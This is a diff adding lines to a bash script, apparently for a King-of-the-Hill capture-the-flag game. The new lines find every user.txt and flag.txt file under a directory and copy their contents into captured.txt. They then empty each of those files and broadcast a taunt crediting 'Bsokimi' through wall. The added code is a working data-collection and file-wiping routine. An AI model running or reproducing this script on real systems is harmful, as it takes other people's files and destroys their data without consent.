@@ -1,4 +1,10 @@
 #!/bin/bash
+# Find all user.txt and flag.txt files and capture their contents
+find /path/to/directory -type f \( -name "user.txt" -o -name "flag.txt" \) -exec cat {} \; >> captured.txt
+# Remove contents from each user.txt and flag.txt file
+find /path/to/directory -type f \( -name "user.txt" -o -name "flag.txt" \) -exec sh -c 'echo -n "" > {}' \;
+# Send a message using wall
+echo "All flags have been captured by Bsokimi." | wall
 # Get your IP address
 my_ip=$(echo $SSH_CLIENT | awk '{print $1}')
 # Search for the "king.txt" file and set the file path
